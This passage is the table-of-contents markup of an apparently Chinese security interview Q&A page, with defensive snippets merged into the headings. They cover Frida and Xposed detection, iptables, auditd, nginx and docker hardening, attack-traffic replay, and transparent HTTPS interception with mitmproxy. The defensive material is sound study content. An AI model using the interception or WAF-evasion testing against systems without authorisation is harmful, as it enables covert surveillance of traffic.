href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%E5%92%8C%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%EF%BC%9F"><span class="toc-number">63.1.</span> <span class="toc-text">常见的调试方法和检测方法？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-Frida%E3%80%81Xposed-%E7%AD%89%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">63.2.</span> <span class="toc-text">如何防止 Frida、Xposed 等注入攻击？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%A3%80%E6%B5%8B-Frida-%E8%BF%9B%E7%A8%8B%EF%BC%9A-%E9%80%9A%E8%BF%87-proc-net-tcp-%E6%A3%80%E6%B5%8B-Frida-%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%EF%BC%9A-2-Xposed-Hook-%E6%A3%80%E6%B5%8B%EF%BC%9A-%E6%A3%80%E6%B5%8B-XposedBridge-jar-%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%EF%BC%9A-3-SELinux-%E5%BC%BA%E5%88%B6%E6%A8%A1%E5%BC%8F%EF%BC%9A-%E8%BF%90%E8%A1%8C-getenforce-%E5%91%BD%E4%BB%A4%EF%BC%8C%E7%A1%AE%E4%BF%9D-SELinux-%E5%A4%84%E4%BA%8E-Enforcing-%E6%A8%A1%E5%BC%8F%E3%80%82"><span class="toc-number">64.</span> <span class="toc-text">防御方法：1. 检测 Frida 进程：   - 通过 &#x2F;proc&#x2F;net&#x2F;tcp 检测 Frida 监听端口：     1Process process &#x3D; Runtime.getRuntime().exec(&quot;netstat -an&quot;);2. Xposed Hook 检测：   - 检测 XposedBridge.jar 是否存在：     1234File xposed &#x3D; new File(&quot;&#x2F;system&#x2F;framework&#x2F;XposedBridge.jar&quot;);if (xposed.exists()) {    throw new SecurityException(&quot;Xposed detected!&quot;);}3. SELinux 强制模式：   - 运行 getenforce 命令，确保 SELinux 处于 Enforcing 模式。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2%E5%BD%93%E5%89%8D%E8%AE%BE%E5%A4%87%E7%9A%84%E6%95%B0%E6%8D%AE%E6%8B%B7%E8%B4%9D%E5%88%B0%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87%EF%BC%9F"><span class="toc-number">64.1.</span> <span class="toc-text">如何防止当前设备的数据拷贝到其他设备？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%EF%BC%9A1-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%EF%BC%9A-Android-%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%EF%BC%9A-2-%E8%AE%BE%E5%A4%87%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%EF%BC%9A-%E7%BB%93%E5%90%88-Device-ID-%E7%94%A8%E6%88%B7-ID-%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%EF%BC%9A-3-%E9%98%BB%E6%AD%A2-ADB-%E8%AE%BF%E9%97%AE%EF%BC%9A-%E7%9B%91%E5%90%AC-adb-%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%EF%BC%9A"><span class="toc-number">65.</span> <span class="toc-text">防御措施：1. 文件权限控制：   - Android 限制文件访问：     12File file &#x3D; new File(context.getFilesDir(), &quot;data.txt&quot;);file.setReadable(false, false);2. 设备绑定机制：   - 结合 Device ID + 用户 ID 进行数据绑定：     1234{  &quot;device_id&quot;: &quot;abcd1234&quot;,  &quot;user_id&quot;: &quot;user5678&quot;}3. 阻止 ADB 访问：   - 监听 adb 连接状态：     1234String adbStatus &#x3D; Settings.Global.getString(getContentResolver(), Settings.Global.ADB_ENABLED);if (&quot;1&quot;.equals(adbStatus)) {    throw new SecurityException(&quot;ADB detected!&quot;);}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E6%8C%82%E6%9C%89%E5%87%A0%E7%A7%8D%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">65.1.</span> <span class="toc-text">外挂有几种类型的实现方式？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%EF%BC%9A-%E6%A3%80%E6%B5%8B%E5%86%85%E5%AD%98%E4%BF%AE%E6%94%B9%EF%BC%8C%E5%90%AF%E7%94%A8-Integrity-Check%E3%80%82-%E4%BD%BF%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%AA%8C%E8%AF%81%E5%85%B3%E9%94%AE%E6%95%B0%E6%8D%AE%EF%BC%8C%E9%81%BF%E5%85%8D%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%AF%A1%E6%94%B9%E3%80%82"><span class="toc-number">66.</span> <span class="toc-text">防御措施：- 检测内存修改，启用 Integrity Check。- 使用服务器验证关键数据，避免客户端篡改。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E6%9C%AA%E7%BB%8F%E7%94%A8%E6%88%B7%E6%8E%88%E6%9D%83%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90%EF%BC%9F"><span class="toc-number">66.1.</span> <span class="toc-text">如何避免未经用户授权获取权限？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8%E5%B2%97"><span class="toc-number">67.</span> <span class="toc-text">基础设施安全岗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DDoS-CC-%E5%A6%82%E4%BD%95%E6%9C%89%E6%95%88%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%BA%94%E6%80%A5%EF%BC%9F"><span class="toc-number">67.1.</span> <span class="toc-text">DDoS&#x2F;CC 如何有效防御与应急？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%AB%8B%E5%8D%B3%E5%B0%81%E7%A6%81%E6%94%BB%E5%87%BB-IP%EF%BC%9A-%E5%88%87%E6%8D%A2%E5%A4%87%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E9%98%B2%E6%AD%A2%E4%B8%9A%E5%8A%A1%E4%B8%AD%E6%96%AD%E3%80%82"><span class="toc-number">68.</span> <span class="toc-text">应急方案：- 立即封禁攻击 IP：  1iptables -A INPUT -s &lt;malicious_ip&gt; -j DROP- 切换备用服务器，防止业务中断。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%B9%E7%BD%91%E7%BB%9C%E5%8C%BA%E5%9F%9F%E8%BF%9B%E8%A1%8C%E5%88%92%E5%88%86%EF%BC%9F"><span class="toc-number">68.1.</span> <span class="toc-text">如何对网络区域进行划分？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E7%BD%91%E7%BB%9C%E4%B8%8E-VPC-%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-number">68.2.</span> <span class="toc-text">经典网络与 VPC 的优势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E5%9F%BA%E7%BA%BF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">68.3.</span> <span class="toc-text">主机最重要的基线是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%EF%BC%9A1-%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99%EF%BC%9A-%E5%85%B3%E9%97%AD%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%9A-2-%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%EF%BC%9A-%E5%90%AF%E7%94%A8-auditd-%E8%AE%B0%E5%BD%95%E5%85%B3%E9%94%AE%E6%93%8D%E4%BD%9C%EF%BC%9A-3-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E4%BB%85%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A-IP-%E7%99%BB%E5%BD%95%EF%BC%9A"><span class="toc-number">69.</span> <span class="toc-text">安全基线：1. 最小权限原则：   - 关闭不必要的服务：     1systemctl disable telnet2. 日志审计：   - 启用 auditd 记录关键操作：     1auditctl -w &#x2F;etc&#x2F;passwd -p wa -k passwd_change3. 访问控制：   - 仅允许特定 IP 登录：     1iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%87%BA%E7%BD%91%E7%9A%84%E4%BB%B7%E5%80%BC%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">69.1.</span> <span class="toc-text">禁止出网的价值有哪些？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%96%BD%E6%96%B9%E6%B3%95%EF%BC%9A-%E9%85%8D%E7%BD%AE%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%EF%BC%9A"><span class="toc-number">70.</span> <span class="toc-text">实施方法：- 配置防火墙规则：  1iptables -A OUTPUT -p tcp -j REJECT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%8B%E7%9A%84%E7%BD%91%E7%BB%9C%E5%92%8C%E4%B8%BB%E6%9C%BA%E5%B7%AE%E5%BC%82%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%BC%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B0%E7%9A%84%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">70.1.</span> <span class="toc-text">云原生下的网络和主机差异是什么？会有哪些新的风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E9%A3%8E%E9%99%A9%EF%BC%9A1-%E5%8A%A8%E6%80%81-IP-%E5%8F%98%E5%8C%96%EF%BC%9A-%E4%BC%A0%E7%BB%9F-ACL-%E8%A7%84%E5%88%99%E9%9A%BE%E4%BB%A5%E9%80%82%E9%85%8D%E3%80%822-%E6%A8%AA%E5%90%91%E6%94%BB%E5%87%BB%E9%A3%8E%E9%99%A9%EF%BC%9A-%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB%E4%B8%8D%E8%B6%B3%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E5%9C%A8%E5%90%8C%E4%B8%80%E9%9B%86%E7%BE%A4%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E3%80%82"><span class="toc-number">71.</span> <span class="toc-text">新风险：1. 动态 IP 变化：   - 传统 ACL 规则难以适配。2. 横向攻击风险：   - 容器网络隔离不足，攻击者可在同一集群内横向移动。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%90%91-HTTPS-%E4%BB%A3%E7%90%86%EF%BC%9F"><span class="toc-number">71.1.</span> <span class="toc-text">如何实现反向 HTTPS 代理？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx-%E9%85%8D%E7%BD%AE%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%9A"><span class="toc-number">72.</span> <span class="toc-text">Nginx 配置反向代理：1234567891011server {    listen 443 ssl;    server_name example.com;        ssl_certificate &#x2F;etc&#x2F;nginx&#x2F;cert.pem;    ssl_certificate_key &#x2F;etc&#x2F;nginx&#x2F;key.pem;    location &#x2F; {        proxy_pass https:&#x2F;&#x2F;backend.server.com;    }}</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5%E9%81%BF%E5%85%8D%E9%9D%9E%E9%A2%84%E6%9C%9F%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%EF%BC%9F"><span class="toc-number">72.1.</span> <span class="toc-text">如何通过技术手段避免非预期端口开放？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%9A-2-%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC%E7%9B%91%E6%B5%8B%EF%BC%9A-3-%E5%BA%94%E7%94%A8%E5%B1%82%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%9A-%E9%85%8D%E7%BD%AE-Nginx-%E4%BB%85%E5%85%81%E8%AE%B8%E7%89%B9%E5%AE%9A-IP-%E8%AE%BF%E9%97%AE%EF%BC%9A"><span class="toc-number">73.</span> <span class="toc-text">方法：1. 使用防火墙：   1iptables -A INPUT -p tcp --dport 3306 -j DROP2. 端口监听监测：   1netstat -tulnp | grep LISTEN3. 应用层访问控制：   - 配置 Nginx 仅允许特定 IP 访问：     12allow 192.168.1.100;deny all;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E7%89%B9%E6%9C%89%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">73.1.</span> <span class="toc-text">容器存在哪些特有安全风险？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD%EF%BC%9A-%E9%99%90%E5%88%B6%E5%AE%B9%E5%99%A8%E6%9D%83%E9%99%90%EF%BC%9A-%E4%BD%BF%E7%94%A8%E5%8F%AF%E4%BF%A1%E9%95%9C%E5%83%8F%E6%9D%A5%E6%BA%90%E3%80%82"><span class="toc-number">74.</span> <span class="toc-text">防护措施：- 限制容器权限：  1docker run --cap-drop&#x3D;ALL- 使用可信镜像来源。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E7%BB%B4%E8%87%AA%E5%B1%8F%E5%8C%96%E7%9A%84%E9%9A%BE%E7%82%B9%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">74.1.</span> <span class="toc-text">运维自屏化的难点是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E8%AF%AD%E8%A8%80%E5%AF%B9%E4%BA%8E%E7%B3%BB%E7%BB%9F-CA-%E8%AF%81%E4%B9%A6%E7%9A%84%E4%BF%A1%E4%BB%BB%E6%83%85%E5%86%B5%E6%9C%89%E4%BD%95%E4%B8%8D%E5%90%8C%EF%BC%9F%E5%A6%82%E4%BD%95%E8%AE%A9%E5%90%84%E8%AF%AD%E8%A8%80%E4%BF%A1%E4%BB%BB%E7%B3%BB%E7%BB%9F-CA-%E8%AF%81%E4%B9%A6%EF%BC%9F"><span class="toc-number">74.2.</span> <span class="toc-text">不同语言对于系统 CA 证书的信任情况有何不同？如何让各语言信任系统 CA 证书？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%88%AA%E5%A4%96%E8%81%94%EF%BC%8C%E5%90%84%E8%87%AA%E5%88%A9%E5%BC%8A%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">74.3.</span> <span class="toc-text">简单描述有哪几种方式实现服务器截外联，各自利弊是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E5%BA%94%E5%AF%B9%E5%B2%97"><span class="toc-number">75.</span> <span class="toc-text">威胁应对岗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%A1%A1%E9%87%8F%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%E8%83%BD%E5%8A%9B%E5%BC%BA%E5%BC%B1%EF%BC%9F"><span class="toc-number">75.1.</span> <span class="toc-text">如何衡量威胁感知能力强弱？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E7%9F%A5%E8%A7%84%E5%88%99%E7%9A%84%E6%9C%89%E6%95%88%E6%80%A7%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E9%AA%8C%E8%AF%81%EF%BC%9F"><span class="toc-number">75.2.</span> <span class="toc-text">感知规则的有效性如何系统验证？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E6%B5%8B%E8%AF%95%EF%BC%9A-%E4%BD%BF%E7%94%A8-Kali-Linux%E3%80%81Metasploit-%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%EF%BC%8C%E6%B5%8B%E8%AF%95%E8%A7%84%E5%88%99%E6%98%AF%E5%90%A6%E7%94%9F%E6%95%88%E3%80%822-%E5%8E%86%E5%8F%B2%E6%94%BB%E5%87%BB%E5%9B%9E%E6%94%BE%EF%BC%9A-%E9%80%9A%E8%BF%87-%E6%97%A5%E5%BF%97%E9%87%8D%E6%94%BE-%E5%A4%8D%E7%8E%B0%E7%9C%9F%E5%AE%9E%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%8B%A6%E6%88%AA%E6%95%88%E6%9E%9C%EF%BC%9A-3-%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E6%B5%8B%E8%AF%95%EF%BC%9A-%E7%94%9F%E6%88%90%E5%8F%98%E7%A7%8D%E6%94%BB%E5%87%BB-payload%EF%BC%8C%E6%B5%8B%E8%AF%95-WAF-%E8%A7%84%E9%81%BF%E8%83%BD%E5%8A%9B%E3%80%82"><span class="toc-number">76.</span> <span class="toc-text">验证方法：1. 攻击模拟测试：   - 使用 Kali Linux、Metasploit 模拟攻击场景，测试规则是否生效。2. 历史攻击回放：   - 通过 日志重放 复现真实攻击流量，验证拦截效果：     1tcpreplay -i eth0 attack_traffic.pcap3. 对抗样本测试：   - 生成变种攻击 payload，测试 WAF 规避能力。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E9%83%A8%E5%88%86%E5%A6%82%E4%BD%95%E8%A1%A1%E9%87%8F%EF%BC%9F"><span class="toc-number">76.1.</span> <span class="toc-text">未知部分如何衡量？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E5%A8%81%E8%83%81%E7%9A%84%E8%A1%A1%E9%87%8F%E6%96%B9%E6%B3%95%EF%BC%9A1-%E5%9F%BA%E7%BA%BF%E5%81%8F%E7%A6%BB%E6%A3%80%E6%B5%8B%EF%BC%9A-%E8%AE%B0%E5%BD%95-%E6%AD%A3%E5%B8%B8%E6%B5%81%E9%87%8F%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%EF%BC%9A-2-%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%EF%BC%9A-%E9%87%87%E7%94%A8-UEBA%EF%BC%88%E7%94%A8%E6%88%B7%E5%AE%9E%E4%BD%93%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%EF%BC%89%EF%BC%8C%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F%E3%80%823-%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF%EF%BC%9A-%E9%83%A8%E7%BD%B2-Honeypot-%E8%AF%B1%E6%8D%95%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%8C%E5%88%86%E6%9E%90%E6%9C%AA%E7%9F%A5%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E3%80%82"><span class="toc-number">77.</span> <span class="toc-text">未知威胁的衡量方法：1. 基线偏离检测：   - 记录 正常流量模式，发现异常行为：     123import pandas as pddf &#x3D; pd.read_csv(&quot;traffic_logs.csv&quot;)df.describe()2. 行为分析：   - 采用 UEBA（用户实体行为分析），检测异常行为模式。3. 蜜罐技术：   - 部署 Honeypot 诱捕攻击者，分析未知攻击方式。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E9%87%87%E9%9B%86%E4%B8%8E%E6%B8%85%E6%B4%97"><span class="toc-number">78.</span> <span class="toc-text">流量采集与清洗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%B1%82%E9%9D%A2%E8%BF%9B%E8%A1%8C%EF%BC%9F"><span class="toc-number">78.1.</span> <span class="toc-text">威胁感知可以在哪些层面进行？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%B1%82%E9%9D%A2%E7%9A%84%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%EF%BC%9A1-%E7%BD%91%E7%BB%9C%E5%B1%82%EF%BC%9A-%E7%9B%91%E6%B5%8B-%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%81DDoS-%E6%94%BB%E5%87%BB%E3%80%822-%E5%BA%94%E7%94%A8%E5%B1%82%EF%BC%9A-%E5%8F%91%E7%8E%B0-SQL-%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BB%A5%E7%94%A8%E3%80%823-%E7%BB%88%E7%AB%AF%E5%B1%82%EF%BC%9A-%E7%9B%91%E6%B5%8B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81C2-%E8%BF%9E%E6%8E%A5%E3%80%824-%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%B1%82%EF%BC%9A-%E9%80%9A%E8%BF%87-UEBA-%E6%A3%80%E6%B5%8B%E8%B4%A6%E5%8F%B7%E7%9B%97%E7%94%A8%E3%80%81%E5%BC%82%E5%B8%B8%E8%AE%BF%E9%97%AE%E3%80%82"><span class="toc-number">79.</span> <span class="toc-text">不同层面的威胁感知：1. 网络层：   - 监测 异常端口扫描、DDoS 攻击。2. 应用层：   - 发现 SQL 注入、XSS、业务滥用。3. 终端层：   - 监测 恶意软件、C2 连接。4. 用户行为层：   - 通过 UEBA 检测账号盗用、异常访问。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%B5%81%E9%87%8F%E8%A6%81%E5%AD%98%E5%82%A8%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5%EF%BC%9F"><span class="toc-number">79.1.</span> <span class="toc-text">TCP 协议的流量要存储哪些关键字段？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5%EF%BC%9A1-%E6%BA%90-IP-%E7%9B%AE%E6%A0%87-IP%EF%BC%9A-%E8%AF%86%E5%88%AB%E6%94%BB%E5%87%BB%E6%9D%A5%E6%BA%90%E3%80%822-%E6%BA%90%E7%AB%AF%E5%8F%A3-%E7%9B%AE%E6%A0%87%E7%AB%AF%E5%8F%A3%EF%BC%9A-%E7%A1%AE%E5%AE%9A%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B%EF%BC%88%E5%A6%82-80-%E4%B8%BA-HTTP%EF%BC%89%E3%80%823-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%BA%8F%E5%88%97%E5%8F%B7%EF%BC%88SEQ%EF%BC%89%EF%BC%9A-%E7%94%A8%E4%BA%8E%E6%A3%80%E6%B5%8B-TCP-%E9%87%8D%E4%BC%A0%E3%80%81%E6%B5%81%E9%87%8F%E9%87%8D%E6%94%BE%E3%80%824-%E6%B5%81%E9%87%8F%E6%96%B9%E5%90%91%EF%BC%88IN-OUT%EF%BC%89%EF%BC%9A-%E4%BE%BF%E4%BA%8E%E5%8C%BA%E5%88%86%E5%87%BA%E7%AB%99-%E5%85%A5%E7%AB%99%E6%B5%81%E9%87%8F%E3%80%82"><span class="toc-number">80.</span> <span class="toc-text">关键字段：1. 源 IP&#x2F;目标 IP：   - 识别攻击来源。2. 源端口&#x2F;目标端口：   - 确定服务类型（如 80 为 HTTP）。3. 数据包序列号（SEQ）：   - 用于检测 TCP 重传、流量重放。4. 流量方向（IN&#x2F;OUT）：   - 便于区分出站&#x2F;入站流量。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%8A%93%E5%8F%96-HTTPS-%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%9F"><span class="toc-number">80.1.</span> <span class="toc-text">如何在服务器上抓取 HTTPS 流量进行分析？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E4%BD%BF%E7%94%A8-mitmproxy-%E8%BF%9B%E8%A1%8C-HTTPS-%E4%BB%A3%E7%90%86"><span class="toc-number">81.</span> <span class="toc-text">方法 3：使用 mitmproxy 进行 HTTPS 代理1mitmproxy -p 8080 --mode transparent</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-C-C-%E9%80%9A%E9%81%93%E7%A7%8D%E7%B1%BB%E5%92%8C%E7%89%B9%E5%BE%81%EF%BC%9F"><span class="toc-number">81.1.</span> <span class="toc-text">常见的 C&amp;C 通道种类和特征？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9C%A8%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E4%B8%AD%E6%A3%80%E6%B5%8B%E5%87%BA%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%EF%BC%9F"><span class="toc-number">81.2.</span> <span class="toc-text">如何在加密流量中检测出恶意流量？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%BC%82%E5%B8%B8%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%96%E8%81%94%EF%BC%9F"><span class="toc-number">81.3.</span> <span class="toc-text">如何识别异常服务器外联？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%BB%9C%E4%BA%94%E5%85%83%E7%BB%84%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E8%A1%8C%E4%B8%BA%E7%9A%84%E5%88%86%E6%9E%90%EF%BC%9F"><span class="toc-number">81.4.</span> <span class="toc-text">基于网络五元组可以做哪些风险行为的分析？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E8%AF%86%E5%88%AB%E4%B8%8E%E5%BA%94%E5%AF%B9-%E4%B8%BB%E6%9C%BA%E4%BE%A7"><span class="toc-number">82.</span> <span class="toc-text">风险识别与应对 - 主机侧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9C%89%E9%82%A3%E4%BA%9B%E6%97%A5%E5%BF%97%E5%AF%B9%E9%A3%8E%E9%99%A9%E8%AF%86%E5%88%AB%E6%9C%89%E5%B8%AE%E5%8A%A9%EF%BC%9F"><span class="toc-number">82.1.</span> <span class="toc-text">主机有那些日志对风险识别有帮助？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 